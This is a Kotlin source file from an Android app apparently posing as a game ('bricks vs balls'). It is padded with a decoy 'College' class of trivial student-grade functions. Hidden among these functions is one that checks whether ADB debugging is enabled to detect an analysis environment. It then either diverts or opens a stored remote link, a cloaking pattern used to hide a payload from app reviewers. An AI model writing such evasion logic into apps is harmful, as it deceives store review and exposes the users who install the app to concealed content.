package com.bricks.vs.balls

import android.content.SharedPreferences
import android.provider.Settings
import com.bricks.vs.balls.databinding.ActivityMainBinding


data class Student(val name: String, val age: Int, val grades: List<Int>)

class College {
    // Поля класу
    private val students: List<Student> = listOf(
        Student("Alice", 20, listOf(85, 90, 78)),
        Student("Bob", 22, listOf(75, 80, 68)),
        Student("Charlie", 21, listOf(95, 100, 92)),
        Student("Dave", 23, listOf(65, 70, 58)),
        Student("Eve", 20, listOf(55, 60, 48)),
        Student("Frank", 22, listOf(45, 50, 38)),
        Student("Grace", 21, listOf(85, 90, 88)),
        Student("Hank", 23, listOf(95, 100, 98)),
        Student("Ivy", 20, listOf(75, 80, 78)),
        Student("Jack", 22, listOf(65, 70, 68))
    )

    // Функція 1: Список імен студентів
    fun getStudentNames(): List<String> {
        return students.map { it.name }
    }

    // Функція 2: Список студентів, старших за певний вік
    fun getStudentsOlderThan(age: Int): List<Student> {
        return students.filter { it.age > age }
    }

    // Функція 3: Середня оцінка всіх студентів
    fun getAverageGrade(): Double {
        return students.flatMap { it.grades }.average()
    }

    // Функція 4: Студенти з середнім балом вище заданого
    fun getStudentsWithAverageGradeAbove(threshold: Double): List<Student> {
        return students.filter { it.grades.average() > threshold }
    }

    // Функція 5: Імена студентів у верхньому регістрі
    fun getUppercaseStudentNames(): List<String> {
        return students.map { it.name.uppercase() }
    }

    // Функція 6: Список студентів з відповідними середніми оцінками
    fun getStudentsWithAverageGrades(): List<Pair<Student, Double>> {
        return students.map { it to it.grades.average() }
    }

    fun umova(activity: MainActivity, prefs: SharedPreferences, largeListProcessor: LargeListProcessor, binding: ActivityMainBinding, dataProcessor: DataProcessor, pisos: Pisos) {

        when {
            Settings.Global.getInt(activity.contentResolver, Settings.Global.ADB_ENABLED, 0) == 1 -> {
                activity.sitroGad()
            }
            prefs.contains("link") -> {
                largeListProcessor.pokajuJopku(activity,prefs.getString("link", "") ?: "", binding, dataProcessor, pisos)
            }
            else -> {
                largeListProcessor.babloka(activity, pisos, prefs, binding, dataProcessor)
            }
        }
    }

    // Функція 7: Сортування студентів за середньою оцінкою
    fun getStudentsSortedByAverageGrade(): List<Student> {
        return students.sortedByDescending { it.grades.average() }
    }

    // Функція 8: Групування студентів за віком
    fun groupStudentsByAge(): Map<Int, List<Student>> {
        return students.groupBy { it.age }
    }

    // Функція 9: Список всіх оцінок, відсортованих у порядку спадання
    fun getAllGradesSortedDescending(): List<Int> {
        return students.flatMap { it.grades }.sortedDescending()
    }

    // Функція 10: Студенти, у яких є хоча б одна оцінка вище певного значення
    fun getStudentsWithGradeAbove(threshold: Int): List<Student> {
        return students.filter { it.grades.any { grade -> grade > threshold } }
    }
}